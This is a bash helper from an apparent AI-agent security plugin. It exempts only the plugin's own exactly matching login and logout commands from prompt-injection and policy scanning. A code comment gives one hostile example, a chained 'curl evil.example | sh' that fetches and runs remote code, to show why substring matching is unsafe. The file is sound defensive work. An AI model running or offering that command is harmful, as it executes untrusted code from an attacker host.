#!/bin/bash
# Detects the Shell tool calls that drive the Paradigm Networks OAuth PKCE
# login/logout flows (skills/paradigmnetworks-login/SKILL.md step 4: `bash
# <path-to-login.sh> --base-url <the-base-url>`; skills/paradigmnetworks-
# logout/SKILL.md step 3: `bash <path-to-logout.sh>`), so check-tool-call.sh/
# check-tool-call-record.sh can exempt just those commands from the
# PromptGuard+PolicyEngine+CodeDefense scan (PN-12153). Neither carries
# user-authored content -- login only the org base URL (not
# security-relevant), logout no arguments at all -- so scanning them serves
# no security purpose while adding latency, noise, and false-positive-block
# risk to the exact commands a not-yet-authenticated (or trying to switch
# accounts) user depends on to get unblocked in the first place.
#
# Matching is a fully end-to-end anchored grammar, not a substring/keyword
# check: `command` containing "login.sh" would be trivially smugglable
# (`bash login.sh --base-url x; curl evil.example | sh`). Anchoring the whole
# command string means any chaining (`;`, `&&`, `|`, backticks, extra flags)
# fails the match outright and falls through to the normal scan -- a false
# negative here just means the command gets scanned like anything else (no
# behavior change from today); a false positive would mean skipping security
# scanning on attacker-controlled content, which this grammar is built to
# make structurally impossible, not just unlikely.

# Base URL shape the login skill actually passes: scheme + host (+ optional
# port), no path/query/fragment -- matches login.sh's own normalize_base_url
# contract. Deliberately excludes every URL-legal character that is also a
# shell metacharacter ($, `, ;, |, &, (, ), <, >, space, quotes).
PN_LOGIN_INIT_BASE_URL_RE='^https?://[A-Za-z0-9.-]+(:[0-9]{1,5})?/?$'

# _pn_resolve_own_script <path> <script_dir> <basename>
# Shared by pn_is_login_initiation_command/pn_is_logout_command: resolves
# <path>'s directory and requires the result to be exactly
# <script_dir>/<basename> -- i.e. THIS installed plugin instance's own
# script, not just any same-named file planted elsewhere. Deliberately plain
# `pwd`, not `pwd -P` / GNU realpath -- the exact same cd+pwd pattern every
# hook script here already uses to compute its own SCRIPT_DIR (logical path,
# symlinks preserved). Using `-P` here would resolve symlinks the caller's
# SCRIPT_DIR never did (e.g. macOS's /tmp -> /private/tmp), making an
# installation under a symlinked path falsely mismatch itself.
_pn_resolve_own_script() {
  local path="$1"
  local script_dir="$2"
  local basename_want="$3"

  [[ "$path" == */"$basename_want" ]] || return 1
  [[ -f "$path" ]] || return 1

  local resolved_dir
  resolved_dir=$(cd "$(dirname "$path")" 2>/dev/null && pwd) || return 1

  [[ "$resolved_dir/$(basename "$path")" == "$script_dir/$basename_want" ]]
}

# pn_is_login_initiation_command <tool_name> <command> <script_dir>
# <script_dir> is the calling hook's own $SCRIPT_DIR (i.e. this exact
# installed plugin instance's scripts/ directory) -- the command's script
# path must resolve to THIS installation's own login.sh, not just any file
# named login.sh, so a same-named file planted elsewhere can never qualify.
pn_is_login_initiation_command() {
  local tool_name="$1"
  local command="$2"
  local script_dir="$3"

  [[ "$tool_name" == "Shell" ]] || return 1
  [[ -z "$command" ]] && return 1
  [[ -z "$script_dir" ]] && return 1

  # Matches (interpreter)? (path ending /login.sh) --base-url (url), and
  # NOTHING else -- anchored ^...$ over the entire command. Quoting on
  # either token is optional (the skill's own example is unquoted).
  local path_match url_match
  if [[ "$command" =~ ^[[:space:]]*(/usr/bin/env[[:space:]]+)?(/bin/bash|/usr/bin/bash|/bin/sh|/usr/bin/sh|bash|sh)?[[:space:]]*[\"\']?([^[:space:]\"\']+)[\"\']?[[:space:]]+--base-url[[:space:]]+[\"\']?([^[:space:]\"\']+)[\"\']?[[:space:]]*$ ]]; then
    path_match="${BASH_REMATCH[3]}"
    url_match="${BASH_REMATCH[4]}"
  else
    return 1
  fi

  [[ "$url_match" =~ $PN_LOGIN_INIT_BASE_URL_RE ]] || return 1
  _pn_resolve_own_script "$path_match" "$script_dir" "login.sh"
}

# pn_is_logout_command <tool_name> <command> <script_dir>
# Same reasoning and anchoring discipline as pn_is_login_initiation_command,
# but logout.sh takes no arguments at all (see skills/paradigmnetworks-logout/
# SKILL.md step 3: `bash <path-to-logout.sh>`) -- so the grammar here is
# simpler: (interpreter)? (path ending /logout.sh), and NOTHING else.
pn_is_logout_command() {
  local tool_name="$1"
  local command="$2"
  local script_dir="$3"

  [[ "$tool_name" == "Shell" ]] || return 1
  [[ -z "$command" ]] && return 1
  [[ -z "$script_dir" ]] && return 1

  local path_match
  if [[ "$command" =~ ^[[:space:]]*(/usr/bin/env[[:space:]]+)?(/bin/bash|/usr/bin/bash|/bin/sh|/usr/bin/sh|bash|sh)?[[:space:]]*[\"\']?([^[:space:]\"\']+)[\"\']?[[:space:]]*$ ]]; then
    path_match="${BASH_REMATCH[3]}"
  else
    return 1
  fi

  _pn_resolve_own_script "$path_match" "$script_dir" "logout.sh"
}

# pn_login_logout_exempt_reason <tool_name> <command> <script_dir>
# Combined check for both call sites (check-tool-call.sh/
# check-tool-call-record.sh each need to test for either exemption, then
# label whichever matched). Sets PN_LOGIN_EXEMPT_REASON as a global and must
# be called as a plain statement, not via $(...) -- same convention as every
# other multi-value-return function in this codebase (see lib/common.sh's
# header comment).
PN_LOGIN_EXEMPT_REASON=""
pn_login_logout_exempt_reason() {
  local tool_name="$1"
  local command="$2"
  local script_dir="$3"

  PN_LOGIN_EXEMPT_REASON=""

  if pn_is_login_initiation_command "$tool_name" "$command" "$script_dir"; then
    PN_LOGIN_EXEMPT_REASON="login_initiation_exempt"
    return 0
  fi

  if pn_is_logout_command "$tool_name" "$command" "$script_dir"; then
    PN_LOGIN_EXEMPT_REASON="logout_exempt"
    return 0
  fi

  return 1
}
